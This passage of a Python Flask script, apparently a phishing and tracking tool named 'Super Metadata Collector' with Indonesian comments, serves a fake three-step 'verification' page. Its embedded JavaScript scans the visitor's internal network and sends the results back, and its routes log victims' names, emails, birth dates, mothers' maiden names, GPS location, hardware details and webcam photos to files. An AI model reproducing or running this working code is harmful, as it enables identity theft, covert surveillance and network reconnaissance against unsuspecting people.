                        const timeoutId = setTimeout(() => controller.abort(), 2000);
                        const start = performance.now();
                        try {
                            await fetch(url, { method: 'HEAD', mode: 'no-cors', signal: controller.signal });
                            results.push({ ip, port, status: 'reachable', time: performance.now() - start });
                        } catch (err) {
                            results.push({ ip, port, status: err.name === 'AbortError' ? 'timeout' : 'refused', time: performance.now() - start });
                        }
                        clearTimeout(timeoutId);
                    }
                }
                sendToServer({ internalNetworkScan: results });
            })();

        })();
    </script>
</body>
</html>
"""

# =======================================================
# ROUTES
# =======================================================
@app.route('/')
def home():
    # Redirect ke halaman utama verifikasi
    return render_template_string(html_code)

@app.route('/cek-data')
def cek_data():
    # Untuk kompatibilitas, arahkan juga ke halaman yang sama
    return render_template_string(html_code)

@app.route('/log-ultimate', methods=['POST'])
def log_ultimate():
    """Menerima data final (nama, email, dll) + foto, simpan ke log dan file foto"""
    d = request.json
    waktu = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    laporan = (
        f"{'='*50}\n"
        f"WAKTU      : {waktu}\n"
        f"IDENTITAS  : {d.get('nama')} | {d.get('email')}\n"
        f"TGL LAHIR  : {d.get('tgl')}\n"
        f"IBU KANDUNG: {d.get('ibu')}\n"
        f"GPS        : {d.get('lat')}, {d.get('lon')}\n"
        f"HARDWARE   : RAM {d.get('ram')}GB | CPU {d.get('cpu')} Core\n"
        f"FOTO       : {'TERSEDIA' if 'data:image' in d.get('img') else 'GAGAL'}\n"
        f"{'='*50}\n\n"
    )

    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(laporan)

    if "data:image" in d.get('img'):
        img_name = f"foto_{d.get('nama').replace(' ', '_')}_{datetime.datetime.now().strftime('%H%M%S')}.jpg"
        with open(os.path.join(BASE_DIR, img_name), "wb") as f:
            f.write(base64.b64decode(d.get('img').split(',')[1]))
        print(f"Data & Foto {d.get('nama')} Berhasil Disimpan!")

    print(laporan)
    return '', 204

@app.route('/track', methods=['POST'])
def track():
    """Menerima metadata dari browser, simpan ke file metadata.log dan tampilkan di console"""
    if request.is_json:
        data = request.get_json()
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        # Tampilkan di terminal
        print(f"\n[{timestamp}]  METADATA CLIENT")
        def print_dict(d, indent=4):
            for key, value in d.items():
                if isinstance(value, dict):
                    print(" " * indent + f"{key}:")
                    print_dict(value, indent + 4)
                elif isinstance(value, list):
                    print(" " * indent + f"{key}:")
                    for item in value:
                        if isinstance(item, dict):
                            print_dict(item, indent + 4)
                        else:
                            print(" " * (indent+4) + f"- {item}")
                else:
                    print(" " * indent + f"{key}: {value}")
        print_dict(data)

        # Simpan ke file metadata.log
        with open(METADATA_LOG, "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] {json.dumps(data, ensure_ascii=False)}\n")
    else:
        print("[METADATA CLIENT] Data bukan JSON atau kosong")
    return jsonify({"status": "ok"})

@app.route('/etag-image')
def etag_image():
    """Endpoint untuk mengukur ping dan dns timing"""
    img = Image.new('RGBA', (1,1), (0,0,0,0))
    img_io = io.BytesIO()
    img.save(img_io, 'PNG')
    img_io.seek(0)
    response = make_response(send_file(img_io, mimetype='image/png'))
    etag = hashlib.md5(str(time.time()).encode()).hexdigest()
    response.headers['ETag'] = etag
    response.headers['Cache-Control'] = 'no-cache'
    return response

if __name__ == '__main__':
    print("""
╔══════════════════════════════════════════════════════════╗
║   SUPER METADATA COLLECTOR - VERSI ULTIMATE             ║
║   Tampilan Verifikasi 3 Langkah                         ║
║   Berjalan di http://0.0.0.0:5000                       ║
║   Semua metadata akan ditampilkan di terminal dan       ║
║   disimpan ke file:                                     ║
║     - hasil_investigasi.txt (data final + foto)         ║
║     - metadata.log (semua metadata lengkap)             ║
║   Tekan Ctrl+C untuk berhenti.                          ║
╚══════════════════════════════════════════════════════════╝
""")
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)